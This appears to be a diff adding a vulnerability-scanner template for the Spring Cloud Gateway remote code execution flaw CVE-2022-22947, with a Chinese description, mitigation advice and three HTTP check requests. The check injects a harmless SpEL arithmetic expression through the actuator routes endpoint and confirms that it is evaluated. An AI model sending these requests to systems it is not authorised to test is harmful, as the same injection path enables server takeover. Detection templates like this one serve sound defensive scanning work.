@@ -1,0 +1,58 @@
+app: Spring
+query: app:"Java"
+meta:
+  name: Spring_Cloud_Gateway_CVE_2022_22947
+  level: 5
+  tags:
+    - remote_code_execution
+  description: |-
+    3月1日，VMware发布了针对Spring Cloud Gateway的漏洞通告，当actuator端点开启并对外暴露时，攻击者可以构造恶意请求实现远程任意代码执行。
+    
+    Spring Cloud Gateway是Spring Cloud 生态中的API网关，包含限流、过滤等API治理功能。Actuator是Spring Boot生态中的应用监控组件，提供了通过http访问监控运行状态的能力。
+    
+    当actuator端点开启时，可以通过http请求修改路由，路由中包含的filter参数会经过SPEL表达式解析，从而导致了漏洞发生。
+  homepage: https://spring.io/guides/gs/spring-boot/
+  author: 一曲成殇
+  references: https://blog.csdn.net/m0_52400001/article/details/123577536
+  solution: |-
+    官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本
+    
+    临时缓解措施：
+    1.如果不需要Gateway actuator endpoint，可通过 management.endpoint.gateway.enabled: false 禁用它。
+    2.如果需要actuator，则应使用 Spring Security 对其进行防护，可参考：https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security
+  steps:
+    verify_steps:
+      type: and
+      verify:
+        - request:
+            method: POST
+            path: /actuator/gateway/routes/vtest
+            redirect: false
+            header:
+              - Content-Type: application/json
+            params: '{"id":"vtest","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"\u0023\u007B999\u002A999\u007D"}}],"uri":"http://example.com","order":0}'
+          response:
+            - name: body
+              value: "998001"
+              type: equals
+        - request:
+            method: POST
+            path: /actuator/gateway/refresh
+            redirect: false
+            header: [ ]
+            params: ""
+          response:
+            - name: body
+              value: "998001"
+              type: equals
+        - request:
+            method: GET
+            path: /actuator/gateway/routes/vtest
+            redirect: false
+            header: [ ]
+            params: ""
+          response:
+            - name: body
+              value: "998001"
+              type: equals
+  create_at: "2022-04-27 15:06:44"
